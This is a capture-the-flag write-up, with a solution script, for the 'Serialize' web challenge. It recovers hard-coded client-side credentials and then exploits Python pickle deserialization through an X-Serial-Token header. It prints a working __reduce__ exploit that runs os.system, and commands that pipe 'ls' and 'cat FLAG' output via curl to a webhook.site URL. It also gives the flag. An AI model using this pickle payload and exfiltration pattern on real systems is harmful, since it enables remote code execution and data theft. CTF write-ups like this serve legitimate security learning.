# serialize [web]

## 問題概要

# Serialize

## Description:

> http://chall.ehax.tech:8008/

`difficulty: medium`

``author: benzo``

## Flag
`E4HX{oh_h3l1_n44www_y0u_8r0k3_5th_w4l1}`

## Writeup
[click here](./writeup)

---

## Writeup

# Serialize

## Description:

> http://chall.ehax.tech:8008/

``Author: Benzo``

## Solution:

We are provided with a login page asking for username, password. But anything entered returns invalid credentials.

So, we check the source code which contains JSFuck Code in script. So, we decode the JSFuck Code, which in turn gives us obfuscated JS. Now, we deobfuscate it and get the login credentials from script, as its a simple client site check taking place in the script for login username and password.

```javascript
const form = document.querySelector('.login-form')
async function submitForm(_0x361a11) {
  const _0x261004 = await fetch('/login', {
    method: 'POST',
    body: JSON.stringify(_0x361a11),
    headers: { 'Content-Type': 'application/json' },
  })
  window.location = '/welcome.png'
}
form.addEventListener('submit', (_0x3f6721) => {
  _0x3f6721.preventDefault()
  const _0x451641 = document.getElementById('username'),
    _0x12fab0 = document.getElementById('password')
  _0x451641.value == 'dreky' && _0x12fab0.value == 'ohyeahboiiiahhuhh'
    ? submitForm({
        user: _0x451641.value,
        pass: _0x12fab0.value,
      })
    : alert('Invalid username or password')
})

```

We get username: `dreky` and password: `ohyeahboiiiahhuhh`

Now, we login using these credentials but it returns a useless image.

welcome.png insert here

We can see in the script that once login request is sent to `/login` route,  the client side code `window.location = '/welcome.png'` enforces instant redirection to `/welcome.png`. If we intercept the login request we can find that it redirects us to a route `/oH_y0u_f0unD_1t_19167` but it can't be seen due to instant redirection to `/welcome.png`.

So, in order to access the server side redirected page, we intercept the request.

When, we checkout the route `/oH_y0u_f0unD_1t_19167`, we get the first part of the flag as: `E4HX{oh` , now when we inspect the source code, we get another piece of flag as: `_h3l1_`.

So, the overall first part becomes: `E4HX{oh_h3l1_` .

Now within the same page we can see a linked style sheet at `/part1_styles.css`, where we found another hidden route `/t0p_s3cr3t_p4g3_7_7`.

```css
.alert.success {
    background-color: #d4edda;
    color: #155724;
    secret: "/t0p_s3cr3t_p4g3_7_7";
}
```

So, we visit this route `/t0p_s3cr3t_p4g3_7_7`. It has the following content -

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>What did you get??</title>
    <style>
        ...
    </style>
</head>
<body class="vsc-initialized">
    <form class="login-form">
        <h2>Part 2</h2>
        <p>Huh you reached the part 2, nice!!!</p>

        <h1>dreky</h1>

    </form>
</body>
</html>
```

Nothing special in the page.. but when we check the response headers, we find a unique header `X-Serial-Token` with a base64 encoded value: `gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAVkcmVreZSFlFKULg==`. On decoding it, we get a python serialized (or pickled) string that can executes a command `dreky` on de-serializing (unpickling).

Let's create a similar kind of token that will execute desired command on de-serializing.

```python
import pickle
import os
import base64

class Exploit:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return os.system, (self.cmd,)

token = base64.b64encode(pickle.dumps(Exploit(' <your_command>'))).decode()

print(token)
```

Here we created our custom token (base64 encoded) from a serialized string that will execute desired command (<your_command>) on de-serializing because [pickle are vulnerable to arbitrary code execution while unpickling](https://docs.python.org/3/library/pickle.html), the `__reduce__` gets called when the serialized token gets de-serialized on the server side.

So if we pass a request header to same route `/t0p_s3cr3t_p4g3_7_7` with the same name as the previous response header `X-Serial-Token` with our custom token it will do something like this -

```python
import requests

token = base64.b64encode(pickle.dumps(Exploit('ls'))).decode()

target = "http://chall.ehax.tech:8008/t0p_s3cr3t_p4g3_7_7"

res = requests.get(target, headers={ "X-Serial-Token": token })

print(res.text)
```

Output of this -

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>What did you get??</title>
    <style>
      ...
    </style>
</head>

<body>
    <form class="login-form">
        <h2>Part 2</h2>
        <p>Huh you reached the part 2, nice!!!</p>

        <h1>0</h1>

    </form>
</body>
</html>
```

This abnormal output `<h1>0</h1`> gives us a proof of shell code execution on the server side.

Now to get the output of shell code we can use [webhook](http://webhook.site/) to send the output of our shell code to webhoook

We can do it by following command -

`<your_command> | curl -X POST -H "Content-Type: application/json" -d @- <your_webhook_url>`

At first we'll create a token for binding output of `ls` command to our webhook and send it as a request header `X-Serial-Token`

```python
import requests

token = base64.b64encode(pickle.dumps(Exploit('ls | curl -X POST -H "Content-Type: application/json" -d @- https://webhook.site/YOUR_WEBHOOK_URL'))).decode()

target = "http://chall.ehax.tech:8008/t0p_s3cr3t_p4g3_7_7"

res = requests.get(target, headers={ "X-Serial-Token": token })

```

Executing this we'll get the following output at our webhook -

![webhook](./img/webhook1.png)

This shows us that there exist some files on the server and also there is a file called `FLAG` which seems useful to us.

If we want to read the content of `FLAG` file we need create another token and send it in the similar way with command   `cat FLAG`

Let's do it by editing our script -

```python
import requests

token = base64.b64encode(pickle.dumps(Exploit('cat FLAG | curl -X POST -H "Content-Type: application/json" -d @- https://webhook.site/YOUR_WEBHOOK_URL'))).decode()

target = "http://chall.ehax.tech:8008/t0p_s3cr3t_p4g3_7_7"

res = requests.get(target, headers={ "X-Serial-Token": token })

```

Now if we see our webhook page after executing this, we'll get something like this -

![serialize ehax-ctf writeup](./img/webhook2.png)

Hence we got our flag 🥳 `E4HX{oh_h3l1_n44www_y0u_8r0k3_5th_w4l1}`

Final script : [solution.py](./solution.py)

---

## 解法スクリプト: solution.py

```python
import pickle
import os
import base64
import requests

class Exploit:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return os.system, (self.cmd,)

token = base64.b64encode(pickle.dumps(Exploit('cat FLAG | curl -X POST -H "Content-Type: application/json" -d @- <YOUR_WEBHOOK_URL>'))).decode()


target = "http://chall.ehax.tech:8008/t0p_s3cr3t_p4g3_7_7"

res = requests.get(target, headers={ "X-Serial-Token": token })

# replace <YOUR_WEBHOOK_URL> with your own webhook url and scheck webhook after executing this
```